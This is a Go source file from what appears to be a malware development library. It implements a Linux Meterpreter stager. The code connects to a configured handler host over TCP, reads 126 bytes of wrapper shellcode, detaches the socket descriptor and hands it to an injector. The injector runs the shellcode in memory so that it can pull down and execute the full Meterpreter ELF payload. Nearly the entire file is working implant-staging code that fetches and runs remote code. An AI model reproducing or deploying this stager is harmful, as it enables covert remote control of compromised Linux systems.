//go:build linux

// Linux-specific implementation of Meterpreter staging.
//
// Linux Meterpreter uses a different staging protocol than Windows:
//  1. Handler sends 126-byte wrapper shellcode (no size prefix)
//  2. Wrapper shellcode reads the full ELF payload from the socket
//  3. Wrapper loads and executes the ELF in memory
//
// The wrapper expects the socket on stdin (fd 0) to read the remaining payload.
package meterpreter

import (
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"time"

	"github.com/oioio-space/maldev/inject"
)

// keepAliveFiles prevents garbage collection of socket file descriptors.
// If these files are GC'd, the underlying socket fd will be closed,
// breaking the Meterpreter connection.
var keepAliveFiles []*os.File

// platformSpecificStage handles Linux staging.
func (s *Stager) platformSpecificStage() error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("this code should only run on Linux")
	}
	return s.stageLinux()
}

func (s *Stager) stageLinux() error {
	shellcode, sockfd, err := s.fetchStageLinux()
	if err != nil {
		return fmt.Errorf("failed to fetch stage: %w", err)
	}

	if len(shellcode) > 500*1024 {
		return fmt.Errorf("received payload too large (%d bytes), probably stageless instead of staged. "+
			"Use handler with staged payload (e.g., linux/x64/meterpreter/reverse_tcp, NOT meterpreter_reverse_tcp)", len(shellcode))
	}

	if len(shellcode) < 50 {
		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
	}

	// Custom injector is not supported on Linux: the Meterpreter wrapper
	// protocol requires the socket fd (reads ELF from stdin via dup2).
	// An arbitrary Injector has no socket awareness.
	if s.config.Injector != nil {
		return fmt.Errorf("custom Injector is not supported for Linux Meterpreter staging: wrapper protocol requires socket access")
	}

	// Default: purego mmap execution with socket passthrough.
	// InjectMeterpreterWrapper handles dup2(sockfd, 0) + mmap + purego.SyscallN
	// for proper System V AMD64 ABI calling convention.
	return inject.InjectMeterpreterWrapper(sockfd, shellcode)
}

// fetchStageLinux retrieves the stage and returns the socket fd.
func (s *Stager) fetchStageLinux() ([]byte, int, error) {
	switch s.config.Transport {
	case TransportTCP:
		return s.fetchStageTCPLinux()
	default:
		return nil, -1, fmt.Errorf("transport %s not yet implemented for Linux (use tcp)", s.config.Transport)
	}
}

// fetchStageTCPLinux retrieves the 126-byte wrapper via TCP and returns
// the wrapper shellcode along with the socket fd for Meterpreter.
func (s *Stager) fetchStageTCPLinux() ([]byte, int, error) {
	address := net.JoinHostPort(s.config.Host, s.config.Port)

	dialer := &net.Dialer{
		Timeout: s.config.Timeout,
	}

	conn, err := dialer.Dial("tcp", address)
	if err != nil {
		return nil, -1, fmt.Errorf("TCP dial failed: %w", err)
	}

	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		conn.Close()
		return nil, -1, fmt.Errorf("not a TCP connection")
	}

	// Read ONLY the 126-byte wrapper shellcode. The wrapper will read
	// the remaining ELF payload from the socket itself.
	tcpConn.SetReadDeadline(time.Now().Add(10 * time.Second))

	stage := make([]byte, 126)
	_, err = io.ReadFull(conn, stage)
	if err != nil {
		conn.Close()
		return nil, -1, fmt.Errorf("failed to read wrapper: %w", err)
	}

	// Remove timeout so Meterpreter can use the socket indefinitely.
	tcpConn.SetReadDeadline(time.Time{})

	// Detach the socket fd from Go's runtime management.
	file, err := tcpConn.File()
	if err != nil {
		conn.Close()
		return nil, -1, fmt.Errorf("failed to get file descriptor: %w", err)
	}

	conn.Close()

	sockfd := int(file.Fd())

	// Store file globally to prevent garbage collection.
	keepAliveFiles = append(keepAliveFiles, file)

	return stage, sockfd, nil
}
